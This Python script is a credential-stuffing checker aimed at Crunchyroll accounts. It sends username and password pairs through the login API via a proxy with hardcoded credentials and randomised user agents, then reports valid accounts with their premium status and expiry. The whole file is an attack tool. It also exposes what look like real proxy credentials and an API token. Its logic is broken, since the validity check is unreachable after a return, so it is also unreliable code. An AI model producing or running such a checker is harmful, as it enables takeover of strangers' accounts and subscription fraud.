import requests
import json

from fake_useragent import UserAgent


def check_account(username, password):
    proxy = "gw.thunderproxies.net:5959:thunderIy42W8mW62G-dc-ANY:S3vPitDabzUK59z57B"
    ip, port, user, pwd = proxy.split(":")
    proxy_dict = {
        "http": f"http://{user}:{pwd}@{ip}:{port}",
        "https": f"http://{user}:{pwd}@{ip}:{port}"
    }
    ua = UserAgent()
    headers = {'User-Agent': ua.random}

    sess = requests.Session()
    sess.proxies.update(proxy_dict)
    sess.headers.update(headers)

    #testing proxies
    ip_address = sess.get('https://api.ipify.org').text
    print(f"Public IP address: {ip_address}")

    data = sess.post(
        url='https://api.crunchyroll.com/start_session.0.json',
        data={
            'version': '1.0',
            'access_token': 'LNDJgOit5yaRIWN',
            'device_type': 'com.crunchyroll.windows.desktop',
            'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId',
            'account': username,
            'password': password
        }
    )

    if "session_id" in data.text:
        try:
            cookies = json.loads(data.text)
        except json.JSONDecodeError:
            print(f"Error decoding JSON for username '{username}': {data.text}")
            return False

        session_id = cookies["data"]["session_id"]

        data2 = sess.post(
            url='https://api.crunchyroll.com/login.0.json',
            data={
                'account': username,
                'password': password,
                'session_id': session_id
            }
        )

        try:
            info = json.loads(data2.text)
        except json.JSONDecodeError:
            print(f"Error decoding JSON for username '{username}': {data2.text}")
            return False

            if info["code"] == "ok":
                # If the account is valid, print premium status and expiration date
                premium_status = info["data"]["user"]["premium"]
                expiration_date = info["data"]["expires"]
                print(f"Premium: {premium_status}, Expiration date: {expiration_date}")
                return True
            else:
                return False
        else:
            return False


accounts = [
    ("yasufake", "test"),
    ("username2", "password2"),
    # ... add more accounts here
]

for account in accounts:
    username, password = account
    is_valid = check_account(username, password)
    print(f"{username}: {'Valid' if is_valid else 'Invalid'}")
